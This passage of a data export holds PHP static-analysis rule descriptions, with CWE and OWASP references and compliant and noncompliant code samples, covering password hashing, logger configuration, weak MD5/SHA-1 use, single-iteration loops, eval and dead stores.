  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>If the hashed data is sensitive, just use the functions <a href=""http://php.net/manual/en/book.password.php"">officially recommended by PHP</a>,
i.e. <code>password_hash</code>, <code>password_verify</code> and <code>password_needs_rehash</code>.</p>
<p>Alternatively you can use the <code>crypt</code> function or <code>hash_pbkdf2</code> functions. Do not use the <code>md5</code> or
<code>sha1</code> for sensitive values, and avoid <code>hash</code> and <code>hash_init</code> whenever possible.</p>
<p>If you use <code>hash_pbkdf2</code> or <code>crypt</code> choose a hashing algorithms which is <a
href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">known to be strong</a>. Check regularly that this is still the case as hashing
algorithms often lose strength over time.</p>
<p>It is recommended to use a hashing function that generate salts automatically, but if you generate salts separately:</p>
<ul>
  <li> generate a cryptographically strong and random salt that is unique for every credential being hashed. </li>
  <li> the salt is applied correctly before the hashing. </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
</ul>
<p> </p>
<p>Note that <code>password_hash</code> generates strong salts automatically.</p>
<p>Remember to rehash your data regularly as the hashing algorithms become less secure over time. The <code>password_needs_rehash</code> function
helps you with that.</p>
<h2>Exceptions</h2>
<p>HMAC computing is out of the scope of this rule. Thus no issue will be raised when the <code>hash_init</code> function is called with
<code>HASH_HMAC</code> given as second parameter.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",php:S4790,php,PHP,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule creates an issue when one of the following functions are called: <a href=""http://php.net/manual/en/function.hash.php"">hash</a>, <a
href=""http://php.net/manual/en/function.hash-init.php"">hash_init</a>, <a href=""http://php.net/manual/en/function.crypt.php"">crypt</a>, <a
href=""http://php.net/manual/en/function.password-hash.php"">password_hash</a>, <a
href=""http://php.net/manual/en/function.hash-pbkdf2.php"">hash_pbkdf2</a>, <a
href=""http://php.net/manual/en/function.openssl-pbkdf2.php"">openssl_pbkdf2</a>, <a href=""http://php.net/manual/en/function.md5.php"">md5</a>, <a
href=""http://php.net/manual/en/function.sha1.php"">sha1</a></p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>If the hashed data is sensitive, just use the functions <a href=""http://php.net/manual/en/book.password.php"">officially recommended by PHP</a>,
i.e. <code>password_hash</code>, <code>password_verify</code> and <code>password_needs_rehash</code>.</p>
<p>Alternatively you can use the <code>crypt</code> function or <code>hash_pbkdf2</code> functions. Do not use the <code>md5</code> or
<code>sha1</code> for sensitive values, and avoid <code>hash</code> and <code>hash_init</code> whenever possible.</p>
<p>If you use <code>hash_pbkdf2</code> or <code>crypt</code> choose a hashing algorithms which is <a
href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">known to be strong</a>. Check regularly that this is still the case as hashing
algorithms often lose strength over time.</p>
<p>It is recommended to use a hashing function that generate salts automatically, but if you generate salts separately:</p>
<ul>
  <li> generate a cryptographically strong and random salt that is unique for every credential being hashed. </li>
  <li> the salt is applied correctly before the hashing. </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
</ul>
<p> </p>
<p>Note that <code>password_hash</code> generates strong salts automatically.</p>
<p>Remember to rehash your data regularly as the hashing algorithms become less secure over time. The <code>password_needs_rehash</code> function
helps you with that.</p>
<h2>Exceptions</h2>
<p>HMAC computing is out of the scope of this rule. Thus no issue will be raised when the <code>hash_init</code> function is called with
<code>HASH_HMAC</code> given as second parameter.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Hashing data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285"">CVE-2018-0285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127"">CVE-2000-1127</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113"">CVE-2017-15113</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742"">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn't have its loggers in ""debug"" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don't log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<p>See</p>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/532.html"">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/778.html"">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Basic PHP configuration:</p>
<pre>
function configure_logging() {
  error_reporting(E_RECOVERABLE_ERROR); // Questionable
  error_reporting(32); // Questionable

  ini_set('docref_root', '1'); // Questionable
  ini_set('display_errors', '1'); // Questionable
  ini_set('display_startup_errors', '1'); // Questionable
  ini_set('error_log', ""path/to/logfile""); // Questionable - check logfile is secure
  ini_set('error_reporting', E_PARSE ); // Questionable
  ini_set('error_reporting', 64); // Questionable
  ini_set('log_errors', '0'); // Questionable
  ini_set('log_errors_max_length', '512'); // Questionable
  ini_set('ignore_repeated_errors', '1'); // Questionable
  ini_set('ignore_repeated_source', '1'); // Questionable
  ini_set('track_errors', '0'); // Questionable

  ini_alter('docref_root', '1'); // Questionable
  ini_alter('display_errors', '1'); // Questionable
  ini_alter('display_startup_errors', '1'); // Questionable
  ini_alter('error_log', ""path/to/logfile""); // Questionable - check logfile is secure
  ini_alter('error_reporting', E_PARSE ); // Questionable
  ini_alter('error_reporting', 64); // Questionable
  ini_alter('log_errors', '0'); // Questionable
  ini_alter('log_errors_max_length', '512'); // Questionable
  ini_alter('ignore_repeated_errors', '1'); // Questionable
  ini_alter('ignore_repeated_source', '1'); // Questionable
  ini_alter('track_errors', '0'); // Questionable
}
</pre>
<p>Definition of custom loggers with <code>psr/log</code></p>
<pre>
abstract class MyLogger implements \Psr\Log\LoggerInterface { // Questionable
    // ...
}

abstract class MyLogger2 extends \Psr\Log\AbstractLogger { // Questionable
    // ...
}

abstract class MyLogger3 {
    use \Psr\Log\LoggerTrait; // Questionable
    // ...
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised for logger configuration when it follows <a href=""https://www.loggly.com/ultimate-guide/php-logging-basics/"">recommended
settings</a> for production servers. The following examples are all valid:</p>
<pre>
  ini_set('docref_root', '0');
  ini_set('display_errors', '0');
  ini_set('display_startup_errors', '0');

  error_reporting(E_ALL);
  error_reporting(32767);
  error_reporting(-1);
  ini_set('error_reporting', E_ALL);
  ini_set('error_reporting', 32767);
  ini_set('error_reporting', -1);

  ini_set('log_errors', '1');
  ini_set('log_errors_max_length', '0');
  ini_set('ignore_repeated_errors', '0');
  ini_set('ignore_repeated_source', '0');
  ini_set('track_errors', '1');
</pre>",php:S4792,php,PHP,"<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285"">CVE-2018-0285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127"">CVE-2000-1127</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113"">CVE-2017-15113</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742"">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn't have its loggers in ""debug"" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don't log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<p>See</p>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/532.html"">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/778.html"">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Basic PHP configuration:</p>
<pre>
function configure_logging() {
  error_reporting(E_RECOVERABLE_ERROR); // Questionable
  error_reporting(32); // Questionable

  ini_set('docref_root', '1'); // Questionable
  ini_set('display_errors', '1'); // Questionable
  ini_set('display_startup_errors', '1'); // Questionable
  ini_set('error_log', ""path/to/logfile""); // Questionable - check logfile is secure
  ini_set('error_reporting', E_PARSE ); // Questionable
  ini_set('error_reporting', 64); // Questionable
  ini_set('log_errors', '0'); // Questionable
  ini_set('log_errors_max_length', '512'); // Questionable
  ini_set('ignore_repeated_errors', '1'); // Questionable
  ini_set('ignore_repeated_source', '1'); // Questionable
  ini_set('track_errors', '0'); // Questionable

  ini_alter('docref_root', '1'); // Questionable
  ini_alter('display_errors', '1'); // Questionable
  ini_alter('display_startup_errors', '1'); // Questionable
  ini_alter('error_log', ""path/to/logfile""); // Questionable - check logfile is secure
  ini_alter('error_reporting', E_PARSE ); // Questionable
  ini_alter('error_reporting', 64); // Questionable
  ini_alter('log_errors', '0'); // Questionable
  ini_alter('log_errors_max_length', '512'); // Questionable
  ini_alter('ignore_repeated_errors', '1'); // Questionable
  ini_alter('ignore_repeated_source', '1'); // Questionable
  ini_alter('track_errors', '0'); // Questionable
}
</pre>
<p>Definition of custom loggers with <code>psr/log</code></p>
<pre>
abstract class MyLogger implements \Psr\Log\LoggerInterface { // Questionable
    // ...
}

abstract class MyLogger2 extends \Psr\Log\AbstractLogger { // Questionable
    // ...
}

abstract class MyLogger3 {
    use \Psr\Log\LoggerTrait; // Questionable
    // ...
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised for logger configuration when it follows <a href=""https://www.loggly.com/ultimate-guide/php-logging-basics/"">recommended
settings</a> for production servers. The following examples are all valid:</p>
<pre>
  ini_set('docref_root', '0');
  ini_set('display_errors', '0');
  ini_set('display_startup_errors', '0');

  error_reporting(E_ALL);
  error_reporting(32767);
  error_reporting(-1);
  ini_set('error_reporting', E_ALL);
  ini_set('error_reporting', 32767);
  ini_set('error_reporting', -1);

  ini_set('log_errors', '1');
  ini_set('log_errors_max_length', '0');
  ini_set('ignore_repeated_errors', '0');
  ini_set('ignore_repeated_source', '0');
  ini_set('track_errors', '1');
</pre>",Configuring loggers is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a10', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-07-31T12:24:47+0200,"<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, or SHA-3.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$password = ...

if (md5($password) === '1f3870be274f6c49b3e31a0c6728957f') { // Noncompliant; md5() hashing algorithm is not secure for password management
   [...]
}

if (sha1($password) === 'd0be2dc421be4fcd0172e5afceea3970e2f3d940') { // Noncompliant; sha1() hashing algorithm is not secure for password management
   [...]
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/328"">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""http://shattered.io/"">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>",php:S2070,php,PHP,"<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, or SHA-3.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$password = ...

if (md5($password) === '1f3870be274f6c49b3e31a0c6728957f') { // Noncompliant; md5() hashing algorithm is not secure for password management
   [...]
}

if (sha1($password) === 'd0be2dc421be4fcd0172e5afceea3970e2f3d940') { // Noncompliant; sha1() hashing algorithm is not secure for password management
   [...]
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/328"">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""http://shattered.io/"">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>",SHA-1 and Message-Digest hash algorithms should not be used in secure contexts,[],CRITICAL,"['cwe', 'owasp-a6', 'sans-top25-porous', 'spring']",VULNERABILITY
2018-11-06T12:16:59+0100,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) { // Noncompliant
  echo ""i is $i"";
  break;
}
...
for ($i = 0; $i &lt; 10; $i++) { // Noncompliant
  if ($i == $x) {
    break;
  } else {
    echo ""i is $i"";
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) {
  echo ""i is $i"";
}
...
for ($i = 0; $i &lt; 10; $i++) {
  if ($i == $x) {
    break;
  } else {
    echo ""i is $i"";
  }
}
</pre>",php:S1751,php,PHP,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) { // Noncompliant
  echo ""i is $i"";
  break;
}
...
for ($i = 0; $i &lt; 10; $i++) { // Noncompliant
  if ($i == $x) {
    break;
  } else {
    echo ""i is $i"";
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) {
  echo ""i is $i"";
}
...
for ($i = 0; $i &lt; 10; $i++) {
  if ($i == $x) {
    break;
  } else {
    echo ""i is $i"";
  }
}
</pre>",Loops with at most one iteration should be refactored,[],MAJOR,[],BUG
2014-06-12T08:21:17+0200,"<p>Executing code dynamically is security sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
</ul>
<p>Any code which is dynamically evaluated in your process will have the same permissions as the rest of your code. Thus it is very dangerous to do so
with code coming from an untrusted source. <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either run on the server or
in the client (exemple: XSS attack).</p>
<p>The <code>eval</code> function is a way to run arbitrary code at run-time. </p>
<p>According to the PHP documentation</p>
<blockquote>
  <p>The eval() language construct is very dangerous because it allows execution of arbitrary PHP code. Its use thus is discouraged. If you have
  carefully verified that there is no other option than to use this construct, pay special attention not to pass any user provided data into it
  without properly validating it beforehand.</p>
</blockquote>
<p>This rule marks for review each occurence of dynamic code execution.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
  <li> the code to run is dynamically chosen via reflection, and an untrusted source can use it to choose which code to run. For example a class could
  be retrieved by its name and this name comes from a user input. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>As for the use of reflection, it should be strictly controlled as it can lead to many vulnerabilities. Never let an untrusted source decide what
code to run. If you have to do it anyway, create a list of allowed code and choose among this list.</p>
<h2>Noncompliant Code Example</h2>
<pre>
eval($code_to_be_dynamically_executed)
</pre>
<h2>Exceptions</h2>
<p>Calling reflection methods with a hard-coded type name, method name or field name will not raise an issue.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",php:S1523,php,PHP,"<p>Executing code dynamically is security sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
</ul>
<p>Any code which is dynamically evaluated in your process will have the same permissions as the rest of your code. Thus it is very dangerous to do so
with code coming from an untrusted source. <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either run on the server or
in the client (exemple: XSS attack).</p>
<p>The <code>eval</code> function is a way to run arbitrary code at run-time. </p>
<p>According to the PHP documentation</p>
<blockquote>
  <p>The eval() language construct is very dangerous because it allows execution of arbitrary PHP code. Its use thus is discouraged. If you have
  carefully verified that there is no other option than to use this construct, pay special attention not to pass any user provided data into it
  without properly validating it beforehand.</p>
</blockquote>
<p>This rule marks for review each occurence of dynamic code execution.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
  <li> the code to run is dynamically chosen via reflection, and an untrusted source can use it to choose which code to run. For example a class could
  be retrieved by its name and this name comes from a user input. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>As for the use of reflection, it should be strictly controlled as it can lead to many vulnerabilities. Never let an untrusted source decide what
code to run. If you have to do it anyway, create a list of allowed code and choose among this list.</p>
<h2>Noncompliant Code Example</h2>
<pre>
eval($code_to_be_dynamically_executed)
</pre>
<h2>Exceptions</h2>
<p>Calling reflection methods with a hard-coded type name, method name or field name will not raise an issue.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",Dynamically executing code is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a7']",SECURITY_HOTSPOT
2018-11-06T12:16:59+0100,"<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$i = $a + $b; // Noncompliant; calculation result not used before value is overwritten
